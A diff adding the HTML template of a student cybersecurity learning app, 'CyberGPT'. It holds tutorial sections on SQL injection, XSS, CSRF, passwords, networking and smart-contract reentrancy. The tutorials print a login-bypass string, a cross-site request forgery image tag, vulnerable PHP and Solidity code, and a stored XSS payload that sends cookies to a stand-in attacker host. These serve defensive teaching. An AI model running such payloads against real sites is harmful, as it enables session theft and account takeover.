@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberGPT – AI Cyber Security Learning Assistant</title>
+    <!-- Google Fonts for premium tech feel -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <!-- Link to Custom CSS -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body class="cyber-theme">
+    
+    <!-- Background grid animation overlay -->
+    <div class="cyber-grid-overlay"></div>
+    <div class="glow-sphere sphere-1"></div>
+    <div class="glow-sphere sphere-2"></div>
+
+    <!-- Notification Toast -->
+    <div id="toast" class="toast hidden"></div>
+
+    <!-- ================== AUTH CONTAINER ================== -->
+    <div id="auth-container" class="auth-container">
+        <div class="auth-card">
+            <div class="auth-logo">
+                <svg class="logo-icon animate-pulse" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                    <path d="M12 8v4M12 16h.01"/>
+                </svg>
+                <h1>CyberGPT</h1>
+                <p class="subtitle">AI Cyber Security Learning Assistant</p>
+            </div>
+            
+            <!-- Tab switches -->
+            <div class="auth-tabs">
+                <button id="tab-login" class="auth-tab active" onclick="switchAuthTab('login')">Login</button>
+                <button id="tab-register" class="auth-tab" onclick="switchAuthTab('register')">Register</button>
+            </div>
+
+            <!-- Login Form -->
+            <form id="login-form" class="auth-form" onsubmit="handleAuth(event, 'login')">
+                <div class="input-group">
+                    <label for="login-email">Email Address</label>
+                    <div class="input-wrapper">
+                        <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+                        <input type="email" id="login-email" required placeholder="name@university.edu">
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label for="login-password">Password</label>
+                    <div class="input-wrapper">
+                        <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                        <input type="password" id="login-password" required placeholder="••••••••">
+                    </div>
+                </div>
+                <button type="submit" class="cyber-btn primary-glow">
+                    <span>ACCESS INTERFACE</span>
+                </button>
+            </form>
+
+            <!-- Register Form -->
+            <form id="register-form" class="auth-form hidden" onsubmit="handleAuth(event, 'register')">
+                <div class="input-group">
+                    <label for="register-email">Email Address</label>
+                    <div class="input-wrapper">
+                        <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+                        <input type="email" id="register-email" required placeholder="name@university.edu">
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label for="register-password">Password</label>
+                    <div class="input-wrapper">
+                        <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                        <input type="password" id="register-password" required placeholder="Minimum 8 characters">
+                    </div>
+                </div>
+                <button type="submit" class="cyber-btn secondary-glow">
+                    <span>CREATE PROFILE</span>
+                </button>
+            </form>
+            
+            <div id="auth-error" class="auth-error-msg hidden"></div>
+        </div>
+    </div>
+
+
+    <!-- ================== MAIN APP STRUCTURE ================== -->
+    <div id="app-container" class="app-container hidden">
+        
+        <!-- SIDEBAR -->
+        <aside class="sidebar">
+            <div class="sidebar-logo">
+                <svg class="logo-svg animate-pulse" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                    <path d="M12 8v4M12 16h.01"/>
+                </svg>
+                <div class="logo-text">
+                    <span class="cyber-title">CYBER<span>GPT</span></span>
+                    <span class="cyber-status"><span class="pulse-dot"></span> SECURE SHELL</span>
+                </div>
+            </div>
+
+            <div class="user-badge">
+                <div class="avatar">
+                    <span>U</span>
+                </div>
+                <div class="user-info">
+                    <span id="user-email-display" class="user-email">student@cyber.edu</span>
+                    <span class="user-role">Student Account</span>
+                </div>
+            </div>
+
+            <nav class="sidebar-nav">
+                <a href="#" class="nav-item active" data-view="dashboard">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="9"/><rect x="14" y="3" width="7" height="5"/><rect x="14" y="12" width="7" height="9"/><rect x="3" y="16" width="7" height="5"/></svg>
+                    Dashboard
+                </a>
+                <a href="#" class="nav-item" data-view="ask-ai">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+                    Ask AI Assistant
+                </a>
+                <a href="#" class="nav-item" data-view="learn-attacks">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+                    Learn Attacks
+                </a>
+                <a href="#" class="nav-item" data-view="quiz">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+                    Take Quiz
+                </a>
+                <a href="#" class="nav-item" data-view="password-analyzer">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                    Password Analyzer
+                </a>
+                <a href="#" class="nav-item" data-view="progress">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></svg>
+                    Progress Report
+                </a>
+            </nav>
+
+            <button onclick="handleLogout()" class="logout-btn">
+                <svg class="logout-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+                Terminate Session
+            </button>
+        </aside>
+
+        <!-- MAIN CONTENT AREA -->
+        <main class="main-content">
+            
+            <!-- Header bar -->
+            <header class="main-header">
+                <div class="breadcrumb">
+                    <span id="breadcrumb-parent">System</span>
+                    <span class="divider">/</span>
+                    <span id="breadcrumb-current" class="active-crumb">Dashboard</span>
+                </div>
+                <div class="system-time">
+                    <span class="label">SECURE_SHELL_CONNECTED // TIME: </span>
+                    <span id="live-time" class="value">00:00:00 UTC</span>
+                </div>
+            </header>
+
+            <!-- ================== VIEW: DASHBOARD ================== -->
+            <section id="view-dashboard" class="app-view active">
+                <div class="view-header">
+                    <h2>Operational Dashboard</h2>
+                    <p class="view-subtitle">Access learning modules, test defenses, and query artificial intelligence agents.</p>
+                </div>
+
+                <!-- Stats summary strip -->
+                <div class="quick-stats-row">
+                    <div class="stat-card cyan-pulse">
+                        <div class="stat-content">
+                            <span class="stat-label">Modules Completed</span>
+                            <span id="dash-completed-count" class="stat-value">0</span>
+                        </div>
+                        <div class="stat-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>
+                        </div>
+                    </div>
+                    <div class="stat-card purple-pulse">
+                        <div class="stat-content">
+                            <span class="stat-label">Quiz Accuracy</span>
+                            <span id="dash-average-score" class="stat-value">0%</span>
+                        </div>
+                        <div class="stat-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>
+                        </div>
+                    </div>
+                    <div class="stat-card orange-pulse">
+                        <div class="stat-content">
+                            <span class="stat-label">Identified Weak Areas</span>
+                            <span id="dash-weak-count" class="stat-value">None</span>
+                        </div>
+                        <div class="stat-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Gradient Cards Grid -->
+                <div class="dashboard-grid">
+                    
+                    <div class="dash-module-card grad-cyan" onclick="navigateTo('ask-ai')">
+                        <div class="card-inner">
+                            <div class="card-icon">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+                            </div>
+                            <h3>Ask AI Assistant</h3>
+                            <p>Query CyberGPT on complex attack vectors, vulnerabilities, and coding practices. Get structured breakdowns including definition, example, impact, and prevention steps.</p>
+                            <span class="action-link">Launch Terminal &rarr;</span>
+                        </div>
+                    </div>
+
+                    <div class="dash-module-card grad-purple" onclick="navigateTo('learn-attacks')">
+                        <div class="card-inner">
+                            <div class="card-icon">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+                            </div>
+                            <h3>Learn Attacks</h3>
+                            <p>Study standard vulnerability databases, including SQLi, XSS, CSRF, and Blockchain. Review detailed definitions and interactive payloads.</p>
+                            <span class="action-link">Browse Datasets &rarr;</span>
+                        </div>
+                    </div>
+
+                    <div class="dash-module-card grad-emerald" onclick="navigateTo('quiz')">
+                        <div class="card-inner">
+                            <div class="card-icon">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+                            </div>
+                            <h3>Take Quiz</h3>
+                            <p>Evaluate your defensive capabilities against dynamically generated scenarios. Select from six core syllabus categories and review detailed answers.</p>
+                            <span class="action-link">Start Evaluation &rarr;</span>
+                        </div>
+                    </div>
+
+                    <div class="dash-module-card grad-amber" onclick="navigateTo('password-analyzer')">
+                        <div class="card-inner">
+                            <div class="card-icon">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                            </div>
+                            <h3>Password Analyzer</h3>
+                            <p>Audit credentials in real-time. Calculate password entropy, scan for dictionary words, evaluate brute-force resistance, and view remediation steps.</p>
+                            <span class="action-link">Analyze Password &rarr;</span>
+                        </div>
+                    </div>
+
+                    <div class="dash-module-card grad-magenta" onclick="navigateTo('progress')">
+                        <div class="card-inner">
+                            <div class="card-icon">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></svg>
+                            </div>
+                            <h3>Progress Report</h3>
+                            <p>Check complete laboratory grades, visualize topic scores on dynamic charts, and examine security weakness warnings tailored to your history.</p>
+                            <span class="action-link">View Stats &rarr;</span>
+                        </div>
+                    </div>
+
+                </div>
+            </section>
+
+            <!-- ================== VIEW: ASK AI ================== -->
+            <section id="view-ask-ai" class="app-view">
+                <div class="view-header">
+                    <h2>AI Cyber Security Assistant</h2>
+                    <p class="view-subtitle">Pose queries to the Llama-3.3-70B model to break down critical concepts, real scenarios, and prevention techniques.</p>
+                </div>
+
+                <div class="card-row">
+                    <div class="panel-card input-panel">
+                        <div class="panel-header">
+                            <span class="tag">QUERY_INPUT</span>
+                            <h3>Formulate Question</h3>
+                        </div>
+                        <div class="suggestions-chips">
+                            <span>Suggestions:</span>
+                            <button class="chip-btn" onclick="prefillQuestion('What is a SQL Injection attack and how does parameterization stop it?')">SQL Injection</button>
+                            <button class="chip-btn" onclick="prefillQuestion('Explain Cross-Site Scripting (XSS) and list three prevention measures.')">XSS Defense</button>
+                            <button class="chip-btn" onclick="prefillQuestion('What is CSRF and how does an anti-CSRF token protect forms?')">CSRF Protection</button>
+                            <button class="chip-btn" onclick="prefillQuestion('Explain what smart contract reentrancy is on Blockchain.')">Blockchain Security</button>
+                        </div>
+                        <form id="ai-query-form" onsubmit="handleAiQuery(event)">
+                            <div class="textarea-wrapper">
+                                <textarea id="ai-question" required placeholder="Type your cybersecurity query here... (e.g., Explain the difference between asymmetric and symmetric encryption.)"></textarea>
+                            </div>
+                            <button type="submit" id="ai-submit-btn" class="cyber-btn primary-glow">
+                                <span id="ai-btn-text">ASK SECURE AGENT</span>
+                                <span id="ai-btn-spinner" class="spinner hidden"></span>
+                            </button>
+                        </form>
+                    </div>
+                </div>
+
+                <!-- Glowing Results Cards -->
+                <div id="ai-results" class="ai-results-grid hidden">
+                    
+                    <div class="output-block border-cyan">
+                        <div class="block-header">
+                            <span class="block-badge bg-cyan">01 / CONCEPT DEFINITION</span>
+                            <h4>What is it?</h4>
+                        </div>
+                        <p id="ai-out-definition" class="block-body"></p>
+                    </div>
+
+                    <div class="output-block border-purple">
+                        <div class="block-header">
+                            <span class="block-badge bg-purple">02 / ATTACK VECTOR EXAMPLE</span>
+                            <h4>Real-world Scenario</h4>
+                        </div>
+                        <p id="ai-out-example" class="block-body font-mono"></p>
+                    </div>
+
+                    <div class="output-block border-red">
+                        <div class="block-header">
+                            <span class="block-badge bg-red">03 / BUSINESS & SYSTEM IMPACT</span>
+                            <h4>Threat Severity & Impact</h4>
+                        </div>
+                        <p id="ai-out-impact" class="block-body"></p>
+                    </div>
+
+                    <div class="output-block border-emerald">
+                        <div class="block-header">
+                            <span class="block-badge bg-emerald">04 / MITIGATION & PREVENTION</span>
+                            <h4>Defensive Remediation</h4>
+                        </div>
+                        <p id="ai-out-prevention" class="block-body"></p>
+                    </div>
+
+                </div>
+            </section>
+
+            <!-- ================== VIEW: LEARN ATTACKS ================== -->
+            <section id="view-learn-attacks" class="app-view">
+                <div class="view-header">
+                    <h2>Attack Database Modules</h2>
+                    <p class="view-subtitle">Select a critical vulnerability category below to read tutorials, explore sample vectors, and trigger test quizzes.</p>
+                </div>
+
+                <div class="learn-container">
+                    <div class="learn-sidebar">
+                        <button class="learn-tab active" onclick="switchLearnTopic('sql_injection')">SQL Injection (SQLi)</button>
+                        <button class="learn-tab" onclick="switchLearnTopic('xss')">Cross-Site Scripting (XSS)</button>
+                        <button class="learn-tab" onclick="switchLearnTopic('csrf')">Cross-Site Request Forgery</button>
+                        <button class="learn-tab" onclick="switchLearnTopic('password_security')">Password Security</button>
+                        <button class="learn-tab" onclick="switchLearnTopic('networking')">Networking Protocols</button>
+                        <button class="learn-tab" onclick="switchLearnTopic('blockchain')">Blockchain Exploits</button>
+                    </div>
+
+                    <div class="learn-content-panel">
+                        
+                        <!-- SQLi Module -->
+                        <div id="topic-sql_injection" class="learn-topic-view active">
+                            <div class="topic-header">
+                                <span class="badge">VULNERABILITY_01</span>
+                                <h3>SQL Injection (SQLi)</h3>
+                            </div>
+                            <div class="topic-body">
+                                <h4>Overview</h4>
+                                <p>SQL Injection (SQLi) occurs when malicious code is inserted into input strings that are later parsed and executed as database queries. This vulnerability typically occurs when user inputs are directly concatenated into query statements rather than parameterized.</p>
+                                
+                                <h4>Attack Vector Details</h4>
+                                <div class="code-box">
+                                    <div class="code-header">Vulnerable PHP Code</div>
+                                    <pre><code>$username = $_POST['user'];
+$password = $_POST['pass'];
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";</code></pre>
+                                </div>
+                                <p>If an attacker inputs <code>' OR 1=1 --</code> in the username field, the compiled SQL query becomes:</p>
+                                <div class="code-box">
+                                    <div class="code-header">Manipulated Query</div>
+                                    <pre><code>SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '...'</code></pre>
+                                </div>
+                                <p>Since <code>1=1</code> is always true, and the comment double hyphen <code>--</code> terminates the rest of the statement, the database executes the query, returns the first user (usually the administrator), and bypasses login completely.</p>
+                                
+                                <h4>Remediation</h4>
+                                <ul>
+                                    <li><strong>Parameterized Queries:</strong> Use Prepared Statements where input is treated strictly as data.</li>
+                                    <li><strong>Object Relational Mapping (ORM):</strong> Utilize ORM frameworks like SQLAlchemy or Hibernate which parameterize queries by default.</li>
+                                    <li><strong>Principle of Least Privilege:</strong> Configure database users to have access permissions only to necessary tables.</li>
+                                </ul>
+                            </div>
+                            <div class="topic-actions">
+                                <button class="cyber-btn primary-glow" onclick="startQuizOnTopic('SQL Injection')">
+                                    <span>TEST KNOWLEDGE ON SQLI</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- XSS Module -->
+                        <div id="topic-xss" class="learn-topic-view">
+                            <div class="topic-header">
+                                <span class="badge">VULNERABILITY_02</span>
+                                <h3>Cross-Site Scripting (XSS)</h3>
+                            </div>
+                            <div class="topic-body">
+                                <h4>Overview</h4>
+                                <p>Cross-Site Scripting (XSS) enables attackers to inject client-side scripts (usually JavaScript) into web pages viewed by other users. The browser cannot detect that the script is malicious and executes it inside the context of the session.</p>
+                                
+                                <h4>Attack Vector Details</h4>
+                                <p>There are three major classifications of XSS:</p>
+                                <ol>
+                                    <li><strong>Stored XSS:</strong> The malicious script is permanently stored on a target server (e.g., in a comments database). When another user accesses the page, the script executes.</li>
+                                    <li><strong>Reflected XSS:</strong> The script is embedded in a malicious URL and reflected off the server response back to the victim (e.g., in query parameter search results).</li>
+                                    <li><strong>DOM-based XSS:</strong> The exploit executes entirely in the client-side JavaScript by parsing URL inputs directly into dangerous sinks like <code>element.innerHTML</code>.</li>
+                                </ol>
+                                <div class="code-box">
+                                    <div class="code-header">Sample Stored Payload</div>
+                                    <pre><code>&lt;script&gt;
+  // Transmits cookies to attacker's server
+  fetch('https://attacker.site/log?cookie=' + document.cookie);
+&lt;/script&gt;</code></pre>
+                                </div>
+                                
+                                <h4>Remediation</h4>
+                                <ul>
+                                    <li><strong>Contextual Output Escaping:</strong> Convert characters like <code>&lt;</code> and <code>&gt;</code> to safe HTML entities (<code>&amp;lt;</code>, <code>&amp;gt;</code>) before outputting.</li>
+                                    <li><strong>Content Security Policy (CSP):</strong> Configure HTTP headers defining allowed origins for scripting files.</li>
+                                    <li><strong>HttpOnly Cookies:</strong> Prevent JavaScript from reading sensitive session cookies via <code>document.cookie</code>.</li>
+                                </ul>
+                            </div>
+                            <div class="topic-actions">
+                                <button class="cyber-btn primary-glow" onclick="startQuizOnTopic('XSS')">
+                                    <span>TEST KNOWLEDGE ON XSS</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- CSRF Module -->
+                        <div id="topic-csrf" class="learn-topic-view">
+                            <div class="topic-header">
+                                <span class="badge">VULNERABILITY_03</span>
+                                <h3>Cross-Site Request Forgery (CSRF)</h3>
+                            </div>
+                            <div class="topic-body">
+                                <h4>Overview</h4>
+                                <p>CSRF is an attack vector that tricks an authenticated user into performing unauthorized actions on a website they are logged into. Because cookies are sent automatically with requests, the target website cannot differentiate between a request made by the user intentionally and a request forged by an external site.</p>
+                                
+                                <h4>Attack Vector Details</h4>
+                                <p>Imagine a user is logged into their bank account at <code>bank.com</code>. The user clicks a link to a malicious website, which loads a hidden image tag:</p>
+                                <div class="code-box">
+                                    <div class="code-header">Forged GET Request</div>
+                                    <pre><code>&lt;img src="https://bank.com/transfer?amount=1000&to=attacker_acct" width="0" height="0" /&gt;</code></pre>
+                                </div>
+                                <p>The browser automatically appends the user's active session cookie for <code>bank.com</code> when sending the request, resulting in a successful transfer without the user's knowledge.</p>
+                                
+                                <h4>Remediation</h4>
+                                <ul>
+                                    <li><strong>Anti-CSRF Tokens:</strong> Use unique, secure, session-bound secrets that must be sent in every state-changing form (e.g. POST, PUT).</li>
+                                    <li><strong>SameSite Cookies:</strong> Enforce the <code>SameSite=Strict</code> or <code>SameSite=Lax</code> attribute to prevent cookies from being sent along with third-party cross-site requests.</li>
+                                    <li><strong>MFA:</strong> Request multi-factor confirmation for critical account modifications.</li>
+                                </ul>
+                            </div>
+                            <div class="topic-actions">
+                                <button class="cyber-btn primary-glow" onclick="startQuizOnTopic('CSRF')">
+                                    <span>TEST KNOWLEDGE ON CSRF</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Password Security Module -->
+                        <div id="topic-password_security" class="learn-topic-view">
+                            <div class="topic-header">
+                                <span class="badge">VULNERABILITY_04</span>
+                                <h3>Password Security</h3>
+                            </div>
+                            <div class="topic-body">
+                                <h4>Overview</h4>
+                                <p>Password security involves creating passwords that are mathematically resistant to automated cracking tools and storing credentials using cryptographic hash algorithms designed to prevent brute force recovery.</p>
+                                
+                                <h4>Cracking Methods</h4>
+                                <ul>
+                                    <li><strong>Brute Force:</strong> Running through all possible character combinations until a match is found.</li>
+                                    <li><strong>Dictionary Attacks:</strong> Testing lists of common passwords, words from dictionaries, and leaked database credentials.</li>
+                                    <li><strong>Rainbow Tables:</strong> Precomputed databases of hashed dictionary files.</li>
+                                </ul>
+                                
+                                <h4>Secure Storage</h4>
+                                <p>Passwords should never be stored in plaintext. They must be salted (appended with unique random bytes) and hashed using CPU-heavy algorithms like <code>bcrypt</code>, <code>Argon2</code>, or <code>PBKDF2</code> to maximize the computing cost for crack pipelines.</p>
+                            </div>
+                            <div class="topic-actions">
+                                <button class="cyber-btn primary-glow" onclick="startQuizOnTopic('Password Security')">
+                                    <span>TEST KNOWLEDGE ON PASSWORDS</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Networking Module -->
+                        <div id="topic-networking" class="learn-topic-view">
+                            <div class="topic-header">
+                                <span class="badge">VULNERABILITY_05</span>
+                                <h3>Networking Protocols</h3>
+                            </div>
+                            <div class="topic-body">
+                                <h4>Overview</h4>
+                                <p>Network-level security focuses on secure configuration, access control, and cryptographic encryption for data in transit across TCP/IP models.</p>
+                                
+                                <h4>Common Hazards</h4>
+                                <ul>
+                                    <li><strong>Man-in-the-Middle (MitM):</strong> Attackers capture packets of local traffic using ARP spoofing or unencrypted Wi-Fi sniffs.</li>
+                                    <li><strong>Port Scans:</strong> Using tools like <code>Nmap</code> to find listening network ports and map application versions for known exploits.</li>
+                                    <li><strong>Denial of Service (DoS):</strong> Flooding a system's port buffers with handshake requests (e.g. SYN Flood) to exhaust memory.</li>
+                                </ul>
+                                
+                                <h4>Defenses</h4>
+                                <ul>
+                                    <li><strong>HTTPS / TLS:</strong> Encrypt HTTP request/response pipelines.</li>
+                                    <li><strong>Firewalls:</strong> Filter incoming network ports and block unsolicited IP ranges.</li>
+                                    <li><strong>Intrusion Detection (IDS):</strong> Monitor signature patterns for unauthorized behavior.</li>
+                                </ul>
+                            </div>
+                            <div class="topic-actions">
+                                <button class="cyber-btn primary-glow" onclick="startQuizOnTopic('Networking')">
+                                    <span>TEST KNOWLEDGE ON NETWORKING</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Blockchain Module -->
+                        <div id="topic-blockchain" class="learn-topic-view">
+                            <div class="topic-header">
+                                <span class="badge">VULNERABILITY_06</span>
+                                <h3>Blockchain Exploits</h3>
+                            </div>
+                            <div class="topic-body">
+                                <h4>Overview</h4>
+                                <p>Blockchain security covers auditing distributed ledger technologies, consensus protocols, and programming errors in executable smart contract systems.</p>
+                                
+                                <h4>Smart Contract Errors</h4>
+                                <p>The most famous smart contract vulnerability is the **Reentrancy attack** (which led to the DAO hack). It occurs when a smart contract transfers ether to an untrusted contract *before* updating its internal balance state.</p>
+                                <div class="code-box">
+                                    <div class="code-header">Vulnerable Solidity function</div>
+                                    <pre><code>function withdraw() public {
+    uint bal = userBalances[msg.sender];
+    require(bal > 0);
+    // Sends ether - triggers attacker fallback function
+    (bool sent, ) = msg.sender.call{value: bal}(""); 
+    require(sent);
+    userBalances[msg.sender] = 0; // State updated TOO LATE
+}</code></pre>
+                                </div>
+                                <p>The attacker's fallback function calls <code>withdraw()</code> again. Since <code>userBalances</code> is still not updated to 0, the contract transfers funds repeatedly until its entire reserve is exhausted.</p>
+                            </div>
+                            <div class="topic-actions">
+                                <button class="cyber-btn primary-glow" onclick="startQuizOnTopic('Blockchain')">
+                                    <span>TEST KNOWLEDGE ON BLOCKCHAIN</span>
+                                </button>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </section>
+
+            <!-- ================== VIEW: QUIZ ================== -->
+            <section id="view-quiz" class="app-view">
+                <div class="view-header">
+                    <h2>Student Knowledge Assessment</h2>
+                    <p class="view-subtitle">Generate interactive multiple-choice quizzes dynamically using Llama-3.3. Verify your scores to advance your grades.</p>
+                </div>
+
+                <div class="quiz-controls-card">
+                    <div class="quiz-controls-form">
+                        <div class="input-group inline-group">
+                            <label for="quiz-topic-select">Select Assessment Category:</label>
+                            <select id="quiz-topic-select" class="cyber-select">
+                                <option value="Networking">Networking Protocols</option>
+                                <option value="SQL Injection">SQL Injection</option>
+                                <option value="XSS">Cross-Site Scripting (XSS)</option>
+                                <option value="CSRF">Cross-Site Request Forgery</option>
+                                <option value="Password Security">Password Security</option>
+                                <option value="Blockchain">Blockchain Security</option>
+                            </select>
+                        </div>
+                        <button onclick="generateQuiz()" class="cyber-btn secondary-glow">
+                            <span>GENERATE ASSESSMENT</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Active Quiz Panel -->
+                <div id="quiz-card" class="panel-card quiz-card hidden">
+                    <div class="quiz-header">
+                        <span id="quiz-topic-tag" class="tag">TOPIC: SQL INJECTION</span>
+                        <div id="quiz-score-tracker" class="quiz-tracker">Score: <span id="quiz-session-score">0 / 0</span></div>
+                    </div>
+                    
+                    <div class="quiz-question-container">
+                        <p id="quiz-question-text" class="quiz-question">Loading evaluation question...</p>
+                    </div>
+
+                    <!-- Multiple choice option buttons -->
+                    <div id="quiz-options-list" class="quiz-options-list">
+                        <!-- JS generated buttons -->
+                    </div>
+
+                    <!-- Explanations block (reveals on click) -->
+                    <div id="quiz-explanation" class="quiz-explanation-box hidden border-cyan">
+                        <div class="box-title">
+                            <span id="explanation-status" class="status-indicator">CORRECT VERDICT</span>
+                            <h4>Explanation</h4>
+                        </div>
+                        <p id="quiz-explanation-text">Detail explanations explaining security theories.</p>
+                        <button onclick="generateQuiz()" class="cyber-btn primary-glow compact-btn">
+                            <span>NEXT EVALUATION QUESTION &rarr;</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Empty State -->
+                <div id="quiz-empty-state" class="empty-state">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+                    <p>Select a learning subject and hit the generate button above to start your exam.</p>
+                </div>
+            </section>
+
+            <!-- ================== VIEW: PASSWORD ANALYZER ================== -->
+            <section id="view-password-analyzer" class="app-view">
+                <div class="view-header">
+                    <h2>Advanced Password Auditor</h2>
+                    <p class="view-subtitle">Input credentials to run cryptographic entropy audits, structural rules analysis, and dictionary leakage checks.</p>
+                </div>
+
+                <div class="analyzer-container">
+                    
+                    <!-- Form input card -->
+                    <div class="panel-card password-input-card">
+                        <div class="panel-header">
+                            <span class="tag">AUDIT_TARGET</span>
+                            <h3>Credentials Under Test</h3>
+                        </div>
+                        <div class="input-group">
+                            <label for="analyzer-input">Enter Password String</label>
+                            <div class="input-wrapper">
+                                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                                <input type="password" id="analyzer-input" onkeyup="checkPasswordLive()" placeholder="Input password here...">
+                                <button type="button" class="eye-toggle-btn" onclick="togglePasswordVisibility('analyzer-input')">
+                                    <svg id="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                                </button>
+                            </div>
+                        </div>
+                        <button onclick="triggerPasswordCheck()" class="cyber-btn primary-glow">
+                            <span>RUN SECURITY AUDIT</span>
+                        </button>
+                    </div>
+
+                    <!-- Statistics result card -->
+                    <div class="panel-card password-results-card">
+                        <div class="panel-header">
+                            <span class="tag">METRICS_REPORT</span>
+                            <h3>Strength Assessment</h3>
+                        </div>
+                        
+                        <div class="strength-meter-section">
+                            <!-- Visual gauge and score -->
+                            <div class="gauge-wrapper">
